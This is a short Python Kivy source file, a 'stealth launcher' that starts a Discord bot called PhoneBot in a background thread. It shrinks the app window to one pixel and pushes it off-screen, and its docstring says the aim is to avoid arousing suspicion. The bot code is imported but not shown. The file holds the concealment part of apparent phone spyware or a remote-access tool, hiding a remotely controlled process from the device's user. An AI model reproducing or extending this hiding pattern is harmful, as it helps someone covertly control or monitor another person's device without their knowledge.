"""
Stealth launcher — starts Discord bot in background thread.
Shows a minimal black screen to not arouse suspicion.
"""
import threading
import asyncio

from kivy.app import App
from kivy.clock import Clock
from kivy.uix.widget import Widget
from kivy.core.window import Window

bot_started = False

def run_bot():
    """Run the Discord bot in this thread's event loop."""
    global bot_started
    if bot_started:
        return
    bot_started = True
    
    import bot
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        token = bot.get_token()
        if not token:
            return
        
        client = bot.PhoneBot(intents=bot.intents)
        loop.run_until_complete(client.start(token))
    except Exception as e:
        print(f"Bot error: {e}")
    finally:
        loop.close()

class StealthApp(App):
    def build(self):
        # Hide the window title bar / minimize visual presence
        Window.size = (1, 1)
        Window.left = -2000  # Push off-screen
        
        # Start bot in background
        t = threading.Thread(target=run_bot, daemon=True)
        t.start()
        
        # Return an empty widget - app stays running, bot keeps working
        return Widget()

if __name__ == "__main__":
    StealthApp().run()
